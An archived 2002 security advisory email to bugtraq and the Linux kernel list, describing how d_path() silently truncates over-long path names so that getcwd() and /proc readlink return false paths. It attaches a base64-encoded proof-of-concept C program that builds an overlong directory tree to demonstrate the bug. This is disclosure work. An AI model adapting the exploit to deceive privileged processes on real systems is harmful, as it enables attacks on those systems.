Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S311959AbSCZNkx>; Tue, 26 Mar 2002 08:40:53 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S312050AbSCZNkq>; Tue, 26 Mar 2002 08:40:46 -0500
Received: from isec.pl ([212.75.96.92]:11271 "EHLO isec.pl")
	by vger.kernel.org with ESMTP id <S311959AbSCZNk3>;
	Tue, 26 Mar 2002 08:40:29 -0500
Date: Tue, 26 Mar 2002 14:40:20 +0100 (CET)
From: Wojciech Purczynski <cliph@isec.pl>
Reply-To: security@isec.pl
To: bugtraq@securityfocus.com, <vulnwatch@vulnwatch.org>,
        <linux-kernel@vger.kernel.org>
Cc: security@isec.pl
Subject: d_path() truncating excessive long path name vulnerability
Message-ID: <Pine.LNX.4.44.0203261416290.27066-200000@isec.pl>
MIME-Version: 1.0
Content-Type: MULTIPART/MIXED; BOUNDARY="1272208480-332988386-1016109190=:18919"
Content-ID: <Pine.LNX.4.44.0203261416360.27066@isec.pl>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

  This message is in MIME format.  The first part should be readable text,
  while the remaining parts are likely unreadable without MIME-aware tools.
  Send mail to mime@docserver.cac.washington.edu for more info.

--1272208480-332988386-1016109190=:18919
Content-Type: TEXT/PLAIN; CHARSET=US-ASCII
Content-ID: <Pine.LNX.4.44.0203261416361.27066@isec.pl>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


Name:		Linux kernel
Version:	up to 2.2.20 and 2.4.18
Homepage:	http://www.kernel.org/
Author:		Wojciech Purczynski <cliph@isec.pl>
Date:		March 26, 2002


Issue:
======

In case of excessively long path names d_path kernel internal function
returns truncated trailing components of a path name instead of an error
value. As this function is called by getcwd(2) system call and
do_proc_readlink() function, false information may be returned to
user-space processes.


Description:
============

Linux is a clone of the operating system Unix, written from scratch by
Linus Torvalds with assistance from a loosely-knit team of hackers across
the Net. It aims towards POSIX and Single UNIX Specification compliance.


Details:
========

d_path kernel function resolves a string of absolute path name of a dentry
passed as an argument to the function.

The path is a concatenation of subsequent path components starting from
trailing path component. The concatenated path name is stored into a
fixed-length buffer of PAGE_SIZE bytes.

If a dentry points to a path that exceeds PAGE_SIZE - 1 characters length,
leading path components are not written to the buffer and function returns
truncated path without an error value.

Because getcwd(2) system call uses d_path() function, it may return
invalid path to the user-space process. However, if a returned path is
longer than user-space buffer a correct error value is returned.

readlink(2) system call called on proc filesystem uses do_proc_readlink()
function which is also vulnerable to d_path() bug.


Impact:
=======

Privileged process may be tricked to think it is inside of arbitrary
directory. Other scenarios are possible if readlink() is used on files on
proc filesystem (like "/proc/self/exe").


PS: Please CC to security@isec.pl as I may not be subscribed to the list.

- --
Wojciech Purczynski
iSEC Security Research
http://isec.pl/

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.0.6 (GNU/Linux)
Comment: For info see http://www.gnupg.org

iD8DBQE8oHpKC+8U3Z5wpu4RAn6qAJ4seIO2xfXvrHmTMFQoMkGus23fJwCgjka7
ew84vFEFTO8lI7PQgEdyG0c=
=sEfh
-----END PGP SIGNATURE-----


--1272208480-332988386-1016109190=:18919
Content-Type: TEXT/PLAIN; CHARSET=US-ASCII; NAME="dpathx.c"
Content-Transfer-Encoding: BASE64
Content-ID: <Pine.LNX.4.44.0203141333100.18919@isec.pl>
Content-Description: proof-of-concept exploit
Content-Disposition: ATTACHMENT; FILENAME="dpathx.c"

LyoNCiAqIDIuMi54LzIuNC54IExpbnV4IGtlcm5lbCBkX3BhdGggcHJvb2Yt
b2YtY29uY2VwdCBleHBsb2l0DQogKg0KICogQnVnIGZvdW5kIGJ5IGNsaXBo
DQogKi8NCg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGlv
Lmg+DQojaW5jbHVkZSA8bGltaXRzLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4N
CiNpbmNsdWRlIDxwYXRocy5oPg0KDQovKg0KICogIE5vdGU6IG9uIExpbnV4
IDIuMi54IFBBVEhfTUFYID0gUEFHRV9TSVpFIC0gMSB0aGF0IGdpdmVzIHVz
IDEgYnl0ZSBmb3IgDQogKiAgICAgICAgdHJhaWxpbmcgJ1wwJyANCiAqLw0K
DQojZGVmaW5lIFBBVEhfQ09NUE9ORU5UICIxMjM0NTY3ODlhYmNkZWYiDQoN
CnZvaWQgZXJyKGNoYXIgKiBtc2cpDQp7DQoJaWYgKGVycm5vKSB7DQoJCXBl
cnJvcihtc2cpOw0KCQlleGl0KDEpOw0KCX0NCn0NCg0KaW50IG1haW4oKQ0K
ew0KCWNoYXIgYnVmW1BBVEhfTUFYICsgMV07IC8qIHRoaW5rIG9mIHRyYWls
aW5nICdcMCcgKi8NCglpbnQgbGVuOw0KCQ0KCWVycm5vID0gMDsNCg0KCWNo
ZGlyKF9QQVRIX1RNUCk7DQoJZXJyKCJjaGRpciIpOw0KCQ0KCS8qIHNob3cg
Q1dEIGJlZm9yZSBleHBsb2l0aW5nIHRoZSBidWcgKi8NCglnZXRjd2QoYnVm
LCBzaXplb2YoYnVmKSk7DQoJZXJyKCJnZXRjd2QgIzEiKTsNCglmcHJpbnRm
KHN0ZGVyciwgIkNXRD0lLjQwc1xuIiwgYnVmKTsNCgkNCgkvKiBjcmVhdGlu
ZyBsb25nIGRpcmVjdG9yeSB0cmVlIC0gaXQgbXVzdCBleGNlZWQgUEFUSF9N
QVggY2hhcmFjdGVycyAqLw0KCWZvciAobGVuID0gMDsgbGVuIDw9IFBBVEhf
TUFYOyBsZW4gKz0gc3RybGVuKFBBVEhfQ09NUE9ORU5UKSArIDEpIHsNCgkJ
ZXJybm8gPSAwOw0KCQlta2RpcihQQVRIX0NPTVBPTkVOVCwgMDcwMCk7DQoJ
CWlmIChlcnJubyAhPSBFRVhJU1QpDQoJCQllcnIoIm1rZGlyIik7DQoJCWVy
cm5vID0gMDsNCgkJY2hkaXIoUEFUSF9DT01QT05FTlQpOw0KCQllcnIoIm1r
ZGlyIik7DQoJfQ0KDQoJLyogc2hvdyBDV0QgYmVmb3JlIGV4cGxvaXRpbmcg
dGhlIGJ1ZyAqLw0KCWdldGN3ZChidWYsIHNpemVvZihidWYpKTsNCgllcnIo
ImdldGN3ZCAjMSIpOw0KCWZwcmludGYoc3RkZXJyLCAiQ1dEPSUuNDBzLi4u
IFtzdHJpcHBlZF1cbiIsIGJ1Zik7DQoJDQoJcmV0dXJuIDA7DQp9DQoNCg==
--1272208480-332988386-1016109190=:18919--
